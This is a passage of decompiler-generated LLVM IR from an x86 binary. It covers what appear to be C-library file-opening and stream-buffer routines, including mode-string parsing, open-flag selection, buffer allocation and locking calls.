  br i1 %v1_80555eb, label %dec_label_pc_80557db, label %dec_label_pc_80555f9

dec_label_pc_80555f9:                             ; preds = %dec_label_pc_80556b7, %dec_label_pc_80555e6
  %v0_80555f9 = load i32, i32* @ebp, align 4
  %v1_80555f9 = add i32 %v0_80555f9, 1
  %v2_80555f9 = inttoptr i32 %v1_80555f9 to i8*
  %v3_80555f9 = load i8, i8* %v2_80555f9, align 1
  %v4_80555f9 = and i8 %v3_80555f9, 32
  %v5_80555f9 = icmp eq i8 %v4_80555f9, 0
  br i1 %v5_80555f9, label %dec_label_pc_80557db, label %dec_label_pc_8055603

dec_label_pc_8055603:                             ; preds = %dec_label_pc_80555f9
  store i32 %v0_80555f9, i32* %stack_var_-76, align 4
  %v1_8055607 = call i32 @function_8052915(i32 %v0_80555f9)
  store i32 %v1_8055607, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80557d6

dec_label_pc_8055613:                             ; preds = %dec_label_pc_80555b8
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8055615

dec_label_pc_8055615:                             ; preds = %dec_label_pc_80555de, %dec_label_pc_80555d5, %dec_label_pc_8055613
  %v0_8055626 = phi i32 [ 1089, %dec_label_pc_80555de ], [ 577, %dec_label_pc_80555d5 ], [ 1, %dec_label_pc_8055613 ]
  %v1_8055615 = add i32 %v4_80555bf, 1
  store i32 %v1_8055615, i32* %eax.global-to-local, align 4
  %v2_8055618 = inttoptr i32 %v1_8055615 to i8*
  %v3_8055618 = load i8, i8* %v2_8055618, align 1
  %v12_8055618 = icmp eq i8 %v3_8055618, 98
  br i1 %v12_8055618, label %dec_label_pc_8055620, label %dec_label_pc_805561e

dec_label_pc_805561e:                             ; preds = %dec_label_pc_8055615
  store i32 %v4_80555bf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055620

dec_label_pc_8055620:                             ; preds = %dec_label_pc_8055615, %dec_label_pc_805561e
  %v0_8055620 = phi i32 [ %v1_8055615, %dec_label_pc_8055615 ], [ %v4_80555bf, %dec_label_pc_805561e ]
  %v1_8055620 = add i32 %v0_8055620, 1
  %v2_8055620 = inttoptr i32 %v1_8055620 to i8*
  %v3_8055620 = load i8, i8* %v2_8055620, align 1
  %v12_8055620 = icmp eq i8 %v3_8055620, 43
  %v1_8055624 = icmp eq i1 %v12_8055620, false
  br i1 %v1_8055624, label %dec_label_pc_805562e, label %dec_label_pc_8055626

dec_label_pc_8055626:                             ; preds = %dec_label_pc_8055620
  store i32 %v0_8055626, i32* %eax.global-to-local, align 4
  %v1_805562b = add nuw nsw i32 %v0_8055626, 1
  store i32 %v1_805562b, i32* @ebx, align 4
  br label %dec_label_pc_805562e

dec_label_pc_805562e:                             ; preds = %dec_label_pc_8055620, %dec_label_pc_8055626
  %v1_805562e = icmp eq i32 %arg3, 0
  %v1_8055630 = icmp eq i1 %v1_805562e, false
  br i1 %v1_8055630, label %dec_label_pc_8055664, label %dec_label_pc_8055632

dec_label_pc_8055632:                             ; preds = %dec_label_pc_805562e
  store i32 80, i32* %stack_var_-76, align 4
  %v1_8055637 = call i32 @function_8051f6a(i32 80)
  store i32 %v1_8055637, i32* %eax.global-to-local, align 4
  store i32 %v1_8055637, i32* @ebp, align 4
  %v2_8055641 = icmp eq i32 %v1_8055637, 0
  br i1 %v2_8055641, label %dec_label_pc_80557dd, label %dec_label_pc_8055649

dec_label_pc_8055649:                             ; preds = %dec_label_pc_8055632
  %v2_8055637 = inttoptr i32 %v1_8055637 to i16*
  store i16 8192, i16* %v2_8055637, align 2
  %v2_8055651 = add i32 %v1_8055637, 8
  %v3_8055651 = inttoptr i32 %v2_8055651 to i32*
  store i32 0, i32* %v3_8055651, align 4
  %v2_8055658 = add i32 %v1_8055637, 56
  store i32 %v2_8055658, i32* %eax.global-to-local, align 4
  store i32 %v2_8055658, i32* %stack_var_-76, align 4
  %v1_805565c = call i32 @function_80506a5(i32 %v2_8055658)
  store i32 %v1_805565c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055664

dec_label_pc_8055664:                             ; preds = %dec_label_pc_805562e, %dec_label_pc_8055649
  %v2_8055664 = icmp slt i32 %arg4, 0
  br i1 %v2_8055664, label %dec_label_pc_80556b1, label %dec_label_pc_8055668

dec_label_pc_8055668:                             ; preds = %dec_label_pc_8055664
  %v0_8055668 = load i32, i32* @ebx, align 4
  %v0_805566a = load i32, i32* @esi, align 4
  %v1_805566a = add i32 %v0_805566a, 1
  store i32 %v1_805566a, i32* %eax.global-to-local, align 4
  %v1_805566d = and i32 %v0_8055668, 32771
  store i32 %v1_805566d, i32* %edx.global-to-local, align 4
  %v1_8055673 = load i32, i32* @ebp, align 4
  %v2_8055673 = add i32 %v1_8055673, 4
  %v3_8055673 = inttoptr i32 %v2_8055673 to i32*
  store i32 %arg4, i32* %v3_8055673, align 4
  %v0_8055676 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055676 = add i32 %v0_8055676, 1
  store i32 %v1_8055676, i32* @edx, align 4
  %v0_8055677 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055677 = and i32 %v0_8055677, %v1_8055676
  store i32 %v2_8055677, i32* %eax.global-to-local, align 4
  %v12_8055679 = icmp eq i32 %v2_8055677, %v1_8055676
  %v1_805567b = icmp eq i1 %v12_8055679, false
  br i1 %v1_805567b, label %dec_label_pc_80555e6, label %dec_label_pc_8055681

dec_label_pc_8055681:                             ; preds = %dec_label_pc_8055668
  %v0_8055681 = load i32, i32* @esi, align 4
  %v1_8055683 = and i32 %v0_8055681, 1024
  %v1_8055685 = xor i32 %v1_8055683, 1024
  store i32 %v1_8055685, i32* %eax.global-to-local, align 4
  %v1_805568a = load i32, i32* @ebx, align 4
  %v2_805568a = and i32 %v1_805568a, %v1_8055685
  %v3_805568a = icmp eq i32 %v2_805568a, 0
  br i1 %v3_805568a, label %dec_label_pc_8055681.dec_label_pc_80556a7_crit_edge, label %dec_label_pc_805568e

dec_label_pc_8055681.dec_label_pc_80556a7_crit_edge: ; preds = %dec_label_pc_8055681
  br label %dec_label_pc_80556a7

dec_label_pc_805568e:                             ; preds = %dec_label_pc_8055681
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8055697 = call i32 @function_8050014(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8055697, i32* %eax.global-to-local, align 4
  %v1_805569f = icmp eq i32 %v3_8055697, 0
  %v1_80556a1 = icmp eq i1 %v1_805569f, false
  br i1 %v1_80556a1, label %dec_label_pc_80555e6, label %dec_label_pc_805568e.dec_label_pc_80556a7_crit_edge

dec_label_pc_805568e.dec_label_pc_80556a7_crit_edge: ; preds = %dec_label_pc_805568e
  %v0_80556a7.pre = load i32, i32* @esi, align 4
  %v0_80556ad.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80556a7

dec_label_pc_80556a7:                             ; preds = %dec_label_pc_8055681.dec_label_pc_80556a7_crit_edge, %dec_label_pc_805568e.dec_label_pc_80556a7_crit_edge
  %v0_80556ad = phi i32 [ %v1_805568a, %dec_label_pc_8055681.dec_label_pc_80556a7_crit_edge ], [ %v0_80556ad.pre, %dec_label_pc_805568e.dec_label_pc_80556a7_crit_edge ]
  %v0_80556a7 = phi i32 [ %v0_8055681, %dec_label_pc_8055681.dec_label_pc_80556a7_crit_edge ], [ %v0_80556a7.pre, %dec_label_pc_805568e.dec_label_pc_80556a7_crit_edge ]
  %v1_80556a7 = and i32 %v0_80556a7, 32768
  %v2_80556ad = or i32 %v1_80556a7, %v0_80556ad
  store i32 %v2_80556ad, i32* @ebx, align 4
  br label %dec_label_pc_80556d2

dec_label_pc_80556b1:                             ; preds = %dec_label_pc_8055664
  %v1_80556b1 = add i32 %arg4, 1
  %v8_80556b1 = icmp eq i32 %v1_80556b1, 0
  store i32 %v1_80556b1, i32* @edi, align 4
  %v0_80556bd.pre = load i32, i32* @ebx, align 4
  br i1 %v8_80556b1, label %dec_label_pc_80556b7, label %dec_label_pc_80556b4

dec_label_pc_80556b4:                             ; preds = %dec_label_pc_80556b1
  %v11_80556b4 = or i32 %v0_80556bd.pre, 32768
  store i32 %v11_80556b4, i32* @ebx, align 4
  br label %dec_label_pc_80556b7

dec_label_pc_80556b7:                             ; preds = %dec_label_pc_80556b1, %dec_label_pc_80556b4
  %v0_80556bd = phi i32 [ %v11_80556b4, %dec_label_pc_80556b4 ], [ %v0_80556bd.pre, %dec_label_pc_80556b1 ]
  %v0_80556be = load i32, i32* @esi, align 4
  store i32 %v0_80556be, i32* %stack_var_-76, align 4
  %v3_80556bf = inttoptr i32 %v0_80556be to i8*
  %v4_80556bf = call i32 @function_80502e4(i8* %v3_80556bf, i32 %v0_80556bd)
  store i32 %v4_80556bf, i32* %eax.global-to-local, align 4
  %v1_80556c7 = load i32, i32* @ebp, align 4
  %v2_80556c7 = add i32 %v1_80556c7, 4
  %v3_80556c7 = inttoptr i32 %v2_80556c7 to i32*
  store i32 %v4_80556bf, i32* %v3_80556c7, align 4
  %v2_80556ca = icmp slt i32 %v4_80556bf, 0
  br i1 %v2_80556ca, label %dec_label_pc_80555f9, label %dec_label_pc_80556d2

dec_label_pc_80556d2:                             ; preds = %dec_label_pc_80556b7, %dec_label_pc_80556a7
  %v0_80556d2 = load i32, i32* @ebp, align 4
  %v1_80556d2 = inttoptr i32 %v0_80556d2 to i16*
  %v2_80556d2 = load i16, i16* %v1_80556d2, align 2
  %v3_80556d2 = and i16 %v2_80556d2, 8192
  store i16 %v3_80556d2, i16* %v1_80556d2, align 2
  %v0_80556d8 = load i32, i32* @ebx, align 4
  %v8_80556da = and i32 %v0_80556d8, -31744
  %v1_80556df = urem i32 %v0_80556d8, 4
  %v1_80556e2 = add nuw nsw i32 %v1_80556df, 1
  store i32 %v1_80556e2, i32* %eax.global-to-local, align 4
  %v1_80556e3 = load i32, i32* @ebp, align 4
  %v2_80556e3 = inttoptr i32 %v1_80556e3 to i32*
  %v3_80556e3 = load i32, i32* %v2_80556e3, align 4
  %v4_80556e3 = or i32 %v3_80556e3, %v8_80556da
  %v1_80556e6 = mul nuw nsw i32 %v1_80556e2, 16
  %v2_80556e9 = xor i32 %v1_80556e6, 48
  store i32 %v2_80556e9, i32* %eax.global-to-local, align 4
  %v2_80556ec = or i32 %v4_80556e3, %v2_80556e9
  store i32 %v2_80556ec, i32* @ebx, align 4
  %v1_80556ee = trunc i32 %v2_80556ec to i16
  %v3_80556ee = inttoptr i32 %v1_80556e3 to i16*
  store i16 %v1_80556ee, i16* %v3_80556ee, align 2
  %v0_80556f2 = load i32, i32* %stack_var_-76, align 4
  %v1_80556f2 = call i32 @function_8050568(i32 %v0_80556f2)
  store i32 %v1_80556f2, i32* %eax.global-to-local, align 4
  store i32 %v1_80556f2, i32* @esi, align 4
  %v1_80556fc = inttoptr i32 %v1_80556f2 to i32*
  %v2_80556fc = load i32, i32* %v1_80556fc, align 4
  store i32 %v2_80556fc, i32* @edi, align 4
  %v0_80556fe = load i32, i32* @ebp, align 4
  %v1_80556fe = add i32 %v0_80556fe, 4
  %v2_80556fe = inttoptr i32 %v1_80556fe to i32*
  %v3_80556fe = load i32, i32* %v2_80556fe, align 4
  store i32 %v3_80556fe, i32* %stack_var_-76, align 4
  %v1_8055701 = call i32 @function_8051730(i32 %v3_80556fe)
  %v2_8055709 = mul i32 %v1_8055701, 256
  store i32 %v2_8055709, i32* %eax.global-to-local, align 4
  %v0_805570c = load i32, i32* @ebx, align 4
  %v2_805570c = or i32 %v0_805570c, %v2_8055709
  store i32 %v2_805570c, i32* @ebx, align 4
  %v1_805570e = trunc i32 %v2_805570c to i16
  %v2_805570e = load i32, i32* @ebp, align 4
  %v3_805570e = inttoptr i32 %v2_805570e to i16*
  store i16 %v1_805570e, i16* %v3_805570e, align 2
  %v0_8055712 = load i32, i32* @edi, align 4
  %v1_8055712 = load i32, i32* @esi, align 4
  %v2_8055712 = inttoptr i32 %v1_8055712 to i32*
  store i32 %v0_8055712, i32* %v2_8055712, align 4
  %v0_8055714 = load i32, i32* @ebp, align 4
  %v1_8055714 = add i32 %v0_8055714, 8
  %v2_8055714 = inttoptr i32 %v1_8055714 to i32*
  %v3_8055714 = load i32, i32* %v2_8055714, align 4
  %v4_8055714 = icmp eq i32 %v3_8055714, 0
  %v1_8055718 = icmp eq i1 %v4_8055714, false
  br i1 %v1_8055718, label %dec_label_pc_8055748, label %dec_label_pc_805571a

dec_label_pc_805571a:                             ; preds = %dec_label_pc_80556d2
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_8055722 = call i32 @function_8051f6a(i32 4096)
  store i32 %v1_8055722, i32* %eax.global-to-local, align 4
  %v1_805572a = load i32, i32* @ebp, align 4
  %v2_805572a = add i32 %v1_805572a, 8
  %v3_805572a = inttoptr i32 %v2_805572a to i32*
  store i32 %v1_8055722, i32* %v3_805572a, align 4
  %v1_805572d = icmp eq i32 %v1_8055722, 0
  %v0_8055741 = load i32, i32* @ebp, align 4
  br i1 %v1_805572d, label %dec_label_pc_8055741, label %dec_label_pc_8055731

dec_label_pc_8055731:                             ; preds = %dec_label_pc_805571a
  %v1_8055731 = inttoptr i32 %v0_8055741 to i16*
  %v2_8055731 = load i16, i16* %v1_8055731, align 2
  %v3_8055731 = or i16 %v2_8055731, 16384
  store i16 %v3_8055731, i16* %v1_8055731, align 2
  %v1_8055737 = add i32 %v1_8055722, 4096
  store i32 %v1_8055737, i32* %eax.global-to-local, align 4
  %v1_805573c = load i32, i32* @ebp, align 4
  %v2_805573c = add i32 %v1_805573c, 12
  %v3_805573c = inttoptr i32 %v2_805573c to i32*
  store i32 %v1_8055737, i32* %v3_805573c, align 4
  br label %dec_label_pc_8055748

dec_label_pc_8055741:                             ; preds = %dec_label_pc_805571a
  %v1_8055741 = add i32 %v0_8055741, 12
  %v2_8055741 = inttoptr i32 %v1_8055741 to i32*
  store i32 0, i32* %v2_8055741, align 4
  br label %dec_label_pc_8055748

dec_label_pc_8055748:                             ; preds = %dec_label_pc_80556d2, %dec_label_pc_8055731, %dec_label_pc_8055741
  %v0_8055748 = load i32, i32* @ebp, align 4
  %v1_8055748 = add i32 %v0_8055748, 8
  %v2_8055748 = inttoptr i32 %v1_8055748 to i32*
  %v3_8055748 = load i32, i32* %v2_8055748, align 4
  store i32 %v3_8055748, i32* %eax.global-to-local, align 4
  %v1_805574b = add i32 %v0_8055748, 2
  %v2_805574b = inttoptr i32 %v1_805574b to i8*
  store i8 0, i8* %v2_805574b, align 1
  %v0_805574f = load i32, i32* %eax.global-to-local, align 4
  %v1_805574f = load i32, i32* @ebp, align 4
  %v2_805574f = add i32 %v1_805574f, 24
  %v3_805574f = inttoptr i32 %v2_805574f to i32*
  store i32 %v0_805574f, i32* %v3_805574f, align 4
  %v0_8055752 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055752 = load i32, i32* @ebp, align 4
  %v2_8055752 = add i32 %v1_8055752, 28
  %v3_8055752 = inttoptr i32 %v2_8055752 to i32*
  store i32 %v0_8055752, i32* %v3_8055752, align 4
  %v0_8055755 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055755 = load i32, i32* @ebp, align 4
  %v2_8055755 = add i32 %v1_8055755, 16
  %v3_8055755 = inttoptr i32 %v2_8055755 to i32*
  store i32 %v0_8055755, i32* %v3_8055755, align 4
  %v0_8055758 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055758 = load i32, i32* @ebp, align 4
  %v2_8055758 = add i32 %v1_8055758, 20
  %v3_8055758 = inttoptr i32 %v2_8055758 to i32*
  store i32 %v0_8055758, i32* %v3_8055758, align 4
  %v0_805575b = load i32, i32* @ebp, align 4
  %v1_805575b = add i32 %v0_805575b, 44
  %v2_805575b = inttoptr i32 %v1_805575b to i32*
  store i32 0, i32* %v2_805575b, align 4
  %v0_8055762 = load i32, i32* @ebp, align 4
  %v1_8055762 = add i32 %v0_8055762, 1
  %v2_8055762 = inttoptr i32 %v1_8055762 to i8*
  %v3_8055762 = load i8, i8* %v2_8055762, align 1
  %v4_8055762 = and i8 %v3_8055762, 32
  %v5_8055762 = icmp eq i8 %v4_8055762, 0
  %v0_8055766 = load i32, i32* @global_var_805d670.411, align 16
  store i32 %v0_8055766, i32* @eax, align 4
  %v2_805576b = add i32 %v0_8055762, 52
  %v3_805576b = inttoptr i32 %v2_805576b to i32*
  store i32 %v0_8055766, i32* %v3_805576b, align 4
  br i1 %v5_8055762, label %dec_label_pc_80557dd, label %dec_label_pc_8055770

dec_label_pc_8055770:                             ; preds = %dec_label_pc_8055748
  %v2_805577b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805577b, i32* %stack_var_-76, align 4
  %v2_8055780 = call i32 @function_80535d2(i32 %v2_805577b, i32 134559183)
  store i32 %v2_8055780, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805d658.308 to i32), i32* %stack_var_-76, align 4
  %v1_805578c = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d658.308 to i32))
  store i32 %v1_805578c, i32* @eax, align 4
  %v2_805579e = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805579e, i32* %stack_var_-76, align 4
  %v2_80557a3 = call i32 @function_80535d2(i32 %v2_805579e, i32 134559183)
  store i32 %v2_80557a3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805d640.307 to i32), i32* %stack_var_-76, align 4
  %v1_80557af = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d640.307 to i32))
  %v0_80557b4 = load i32, i32* bitcast (i32** @global_var_805d63c.309 to i32*), align 4
  store i32 %v0_80557b4, i32* @eax, align 4
  %v1_80557b9 = load i32, i32* @ebp, align 4
  %v2_80557b9 = add i32 %v1_80557b9, 32
  %v3_80557b9 = inttoptr i32 %v2_80557b9 to i32*
  store i32 %v0_80557b4, i32* %v3_80557b9, align 4
  %v0_80557bc = load i32, i32* @ebp, align 4
  store i32 %v0_80557bc, i32* bitcast (i32** @global_var_805d63c.309 to i32*), align 4
  %v2_80557c2 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_80557c2, i32* @ecx, align 4
  store i32 %v2_805579e, i32* %stack_var_-76, align 4
  %v2_80557c7 = call i32 @function_80535d2(i32 %v2_805579e, i32 1)
  store i32 %v2_805579e, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_805577b, i32* %stack_var_-76, align 4
  %v2_80557d1 = call i32 @function_80535d2(i32 %v2_805577b, i32 1)
  store i32 %v2_80557d1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80557d6

dec_label_pc_80557d6:                             ; preds = %dec_label_pc_8055603, %dec_label_pc_8055770
  br label %dec_label_pc_80557dd

dec_label_pc_80557db:                             ; preds = %dec_label_pc_80555f9, %dec_label_pc_80555e6
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80557dd

dec_label_pc_80557dd:                             ; preds = %dec_label_pc_8055748, %dec_label_pc_8055632, %dec_label_pc_80557d6, %dec_label_pc_80557db
  %v0_80557e0 = load i32, i32* @ebp, align 4
  store i32 %v0_80557e0, i32* %eax.global-to-local, align 4
  %v2_80557e2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80557e2, i32* @ebx, align 4
  store i32 %v0_80555ba, i32* @esi, align 4
  store i32 %v0_80555b9, i32* @edi, align 4
  store i32 %v0_80555b8, i32* @ebp, align 4
  ret i32 %v0_80557e0

; uselistorder directives
  uselistorder i32 %v2_805579e, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_805577b, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8055741, { 1, 0 }
  uselistorder i32 %v1_8055722, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8055709, { 1, 0 }
  uselistorder i32 %v1_80556f2, { 1, 0, 2 }
  uselistorder i32 %v11_80556b4, { 1, 0 }
  uselistorder i32 %v0_80556bd.pre, { 1, 0 }
  uselistorder i32 %v1_8055685, { 1, 0 }
  uselistorder i32 %v0_8055681, { 1, 0 }
  uselistorder i32 %v1_8055676, { 1, 0, 2 }
  uselistorder i32 %v1_8055637, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_8055626, { 1, 0 }
  uselistorder i32 %v0_80555f9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 4096, { 13, 11, 12, 0, 1, 14, 15, 5, 9, 6, 3, 10, 7, 4, 2, 8 }
  uselistorder i32 (i32)* @function_8051730, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_80502e4, { 3, 4, 0, 1, 2 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_8050014, { 1, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 1024, { 3, 1, 2, 0, 9, 4, 7, 6, 8, 5 }
  uselistorder i32 (i32)* @function_80506a5, { 3, 2, 1, 0, 4 }
  uselistorder i32 22, { 9, 5, 10, 1, 2, 3, 4, 8, 12, 6, 7, 11, 0 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_80557dd, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80557d6, { 1, 0 }
  uselistorder label %dec_label_pc_8055748, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80556b7, { 1, 0 }
  uselistorder label %dec_label_pc_80556a7, { 1, 0 }
  uselistorder label %dec_label_pc_8055664, { 1, 0 }
  uselistorder label %dec_label_pc_805562e, { 1, 0 }
  uselistorder label %dec_label_pc_8055620, { 1, 0 }
  uselistorder label %dec_label_pc_8055615, { 2, 0, 1 }
}

define i32 @function_80557e8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80557e8:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80557f4 = add i32 %tmp5, 4
  %v2_80557f4 = inttoptr i32 %v1_80557f4 to i32*
  %v3_80557f4 = load i32, i32* %v2_80557f4, align 4
  %v2_80557f7 = load i32, i32* %arg2, align 4
  %v1_80557fd = add i32 %arg1, 4
  %v2_80557fd = inttoptr i32 %v1_80557fd to i32*
  %v3_80557fd = load i32, i32* %v2_80557fd, align 4
  %v4_8055800 = call i32 @function_8056734(i32 %v3_80557fd, i32 %v2_80557f7, i32 %v3_80557f4, i32 %arg3)
  %v0_805580a = load i32, i32* @edx, align 4
  %v2_805580a = icmp slt i32 %v0_805580a, 0
  br i1 %v2_805580a, label %dec_label_pc_8055815, label %dec_label_pc_805580e

dec_label_pc_805580e:                             ; preds = %dec_label_pc_80557e8
  %v1_805580e = load i32, i32* @ebx, align 4
  %v2_805580e = inttoptr i32 %v1_805580e to i32*
  store i32 %v4_8055800, i32* %v2_805580e, align 4
  %v0_8055810 = load i32, i32* @edx, align 4
  %v1_8055810 = load i32, i32* @ebx, align 4
  %v2_8055810 = add i32 %v1_8055810, 4
  %v3_8055810 = inttoptr i32 %v2_8055810 to i32*
  store i32 %v0_8055810, i32* %v3_8055810, align 4
  br label %dec_label_pc_8055815

dec_label_pc_8055815:                             ; preds = %dec_label_pc_80557e8, %dec_label_pc_805580e
  %v0_8055815 = phi i32 [ %v4_8055800, %dec_label_pc_80557e8 ], [ 0, %dec_label_pc_805580e ]
  ret i32 %v0_8055815

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8055815, { 1, 0 }
}

define i32 @function_805581c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805581c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805581c = load i32, i32* @edi, align 4
  %v0_805581d = load i32, i32* @esi, align 4
  %v0_805581e = load i32, i32* @ebx, align 4
  %v12_805581f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_8055826 = add i32 %arg3, 52
  %v2_8055826 = inttoptr i32 %v1_8055826 to i32*
  %v3_8055826 = load i32, i32* %v2_8055826, align 4
  store i32 %v3_8055826, i32* @edi, align 4
  %v1_8055829 = icmp eq i32 %v3_8055826, 0
  %v1_805582b = icmp eq i1 %v1_8055829, false
  br i1 %v1_805582b, label %dec_label_pc_805581c.dec_label_pc_805584c_crit_edge, label %dec_label_pc_805582d

dec_label_pc_805581c.dec_label_pc_805584c_crit_edge: ; preds = %dec_label_pc_805581c
  br label %dec_label_pc_805584c

dec_label_pc_805582d:                             ; preds = %dec_label_pc_805581c
  %v1_805582d = add i32 %arg3, 56
  store i32 %v1_805582d, i32* @ebx, align 4
  store i32 %v12_805581f, i32* @eax, align 4
  %v2_805583c = call i32 @function_80535d2(i32 %v12_805581f, i32 134559183)
  %v0_8055841 = load i32, i32* @ebx, align 4
  %v1_8055844 = call i32 @function_80535cf(i32 %v0_8055841)
  %v0_805584d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805584c

dec_label_pc_805584c:                             ; preds = %dec_label_pc_805581c.dec_label_pc_805584c_crit_edge, %dec_label_pc_805582d
  %v0_805584d = phi i32 [ %arg3, %dec_label_pc_805581c.dec_label_pc_805584c_crit_edge ], [ %v0_805584d.pre, %dec_label_pc_805582d ]
  %v0_805584c = load i32, i32* @edx, align 4
  %v4_8055856 = inttoptr i32 %arg1 to i8*
  %v5_8055856 = call i32 @function_8055aa8(i8* %v4_8055856, i32 %arg2, i32 %v0_805584d, i32 %v0_805584c)
  store i32 %v5_8055856, i32* %ebx.global-to-local, align 4
  br i1 %v1_805582b, label %dec_label_pc_8055875, label %dec_label_pc_8055864

dec_label_pc_8055864:                             ; preds = %dec_label_pc_805584c
  store i32 %v12_805581f, i32* @eax, align 4
  %v2_805586d = call i32 @function_80535d2(i32 %v12_805581f, i32 1)
  %v0_8055878.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055875

dec_label_pc_8055875:                             ; preds = %dec_label_pc_805584c, %dec_label_pc_8055864
  %v0_8055878 = phi i32 [ %v5_8055856, %dec_label_pc_805584c ], [ %v0_8055878.pre, %dec_label_pc_8055864 ]
  store i32 %v0_805581e, i32* @ebx, align 4
  store i32 %v0_805581d, i32* @esi, align 4
  store i32 %v0_805581c, i32* @edi, align 4
  ret i32 %v0_8055878

; uselistorder directives
  uselistorder i32 %v12_805581f, { 2, 3, 0, 1 }
  uselistorder i32 52, { 9, 10, 6, 11, 2, 12, 1, 3, 4, 8, 5, 14, 15, 7, 13, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8055875, { 1, 0 }
  uselistorder label %dec_label_pc_805584c, { 1, 0 }
}

define i32 @function_8055880() local_unnamed_addr {
dec_label_pc_8055880:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_805588f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805588f, i32* @eax, align 4
  %v2_8055894 = call i32 @function_80535d2(i32 %v2_805588f, i32 134559183)
  %v1_80558a0 = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d658.308 to i32))
  %v0_80558a5 = load i32, i32* @global_var_80618e4.409, align 4
  %v8_80558ad = icmp eq i32 %v0_80558a5, 1
  %v1_80558ae = icmp eq i1 %v8_80558ad, false
  br i1 %v1_80558ae, label %dec_label_pc_8055945, label %dec_label_pc_80558b4

dec_label_pc_80558b4:                             ; preds = %dec_label_pc_8055880
  %v0_80558b4 = load i32, i32* @global_var_80618e8.410, align 8
  %tmp29 = icmp slt i32 %v0_80558b4, 1
  br i1 %tmp29, label %dec_label_pc_8055945, label %dec_label_pc_80558c1

dec_label_pc_80558c1:                             ; preds = %dec_label_pc_80558b4
  store i32 0, i32* @esi, align 4
  %v2_80558ce = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_80558ce, i32* @eax, align 4
  %v2_80558d3 = call i32 @function_80535d2(i32 %v2_80558ce, i32 134559183)
  %v1_80558df = call i32 @function_80535cf(i32 ptrtoint (i32* @global_var_805d640.307 to i32))
  %v0_80558e4 = load i32, i32* bitcast (i32** @global_var_805d63c.309 to i32*), align 4
  store i32 %v0_80558e4, i32* %edx.global-to-local, align 4
  %v1_80559263 = icmp eq i32 %v0_80558e4, 0
  %v1_805592810 = icmp eq i1 %v1_80559263, false
  br i1 %v1_805592810, label %dec_label_pc_80558ef, label %dec_label_pc_805592a

dec_label_pc_80558ef:                             ; preds = %dec_label_pc_80558c1, %dec_label_pc_8055924
  %v0_80558ff = phi i32 [ %v0_8055924, %dec_label_pc_8055924 ], [ %v0_80558e4, %dec_label_pc_80558c1 ]
  %v1_80558ef13 = inttoptr i32 %v0_80558ff to i16*
  %v2_80558ef = load i16, i16* %v1_80558ef13, align 2
  %v1_80558f7 = add i32 %v0_80558ff, 32
  %v2_80558f7 = inttoptr i32 %v1_80558f7 to i32*
  %v3_80558f7 = load i32, i32* %v2_80558f7, align 4
  store i32 %v3_80558f7, i32* @ebx, align 4
  %v1_80558f2 = and i16 %v2_80558ef, -32720
  %v6_80558fa = icmp eq i16 %v1_80558f2, 48
  br i1 %v6_80558fa, label %dec_label_pc_8055903, label %dec_label_pc_80558ff

